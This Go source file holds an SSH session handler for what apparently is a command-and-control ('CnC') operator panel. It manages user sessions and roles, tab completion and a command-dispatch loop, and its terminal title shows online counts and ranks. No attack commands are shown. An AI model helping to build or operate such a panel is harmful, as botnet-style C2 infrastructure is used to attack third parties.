package net

import (
	"api/core/database/users"
	"api/core/models"
	"api/core/models/log"
	"api/core/net/commands"
	"api/core/net/sessions"
	"api/core/net/term"
	"fmt"
	"strconv"
	"strings"
	"time"

	"github.com/gliderlabs/ssh"
	"sort"
)

type Admin struct {
	conn ssh.Session
}

func NewAdmin(ssh ssh.Session) *Admin {
	return &Admin{ssh}
}

func (net *Admin) Handle() {
	//more auth
	net.conn.Write([]byte("\033[?1049h"))
	net.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

	defer func() {
		net.conn.Write([]byte("\033[?1049l"))
	}()

	userInfo, err := users.Container.GetUser(net.conn.User())
	if err != nil {
		net.conn.Write([]byte(fmt.Sprintf("Error retrieving user info: %v", err)))
		return
	}
	netconn := term.NewSSHConn(net.conn)
	net.conn.Write([]byte("\r\n\033[0m"))
	var Session = &sessions.Session{
		User: userInfo,
		Conn: netconn,
	}
	Session.CreateCookie()
	sessions.SessionMutex.Lock()
	for _, session := range sessions.Sessions {
		if session.User.Username == userInfo.Username {
			net.conn.Write([]byte(fmt.Sprintf("Session Already Open!\r\n")))
			log.Println(session.User.Username + " already has a session open!")
			sessions.SessionMutex.Unlock()
			return
		}
	}
	sessions.Sessions[Session.ID] = Session
	sessions.SessionMutex.Unlock()
	var role string
	if users.HasPermission(Session.User, "admin") {
		role = "admin"
	} else {
		role = "user"
	}
	sshConn := term.NewSSHConn(net.conn)
	tm := term.New(sshConn, func(prefix string) []string {
	  // exactly the same completer you used for telnet
	  var matches []string
	  for name := range commands.Commands {
		if strings.HasPrefix(name, prefix) {
		  matches = append(matches, name)
		}
	  }
	  sort.Strings(matches)
	  return matches
	})
	//title
	go func() {
		i := 0
		for {
			time.Sleep(time.Second)
			term.SetTitle(net.conn, " ["+SpinnerChars[i%len(SpinnerChars)]+"] "+models.Config.Name+" CnC - Username ["+Session.User.Username+"] - Online ["+strconv.Itoa(sessions.Count())+"] - Rank ["+role+"]")
			i++
		}

	}()
	net.conn.Write([]byte("\033[2J\033[1;1H"))

	//handler
	commands.Commands["splash-home"].Exec(Session, nil)
	for {
		cmd, err := tm.ReadLine(fmt.Sprintf("%s@%s# ", Session.User.Username, models.Config.Name))
		if err != nil {
			return
		}
		cmdlist := strings.Split(cmd, " ")
		if !commands.IsCommand(cmdlist[0]) {
			fmt.Fprintf(net.conn, "Command (%s) is Invalid\r\n", cmdlist[0])
		} else {
			commands.Commands[cmdlist[0]].Exec(Session, cmdlist)
		}
	}
}
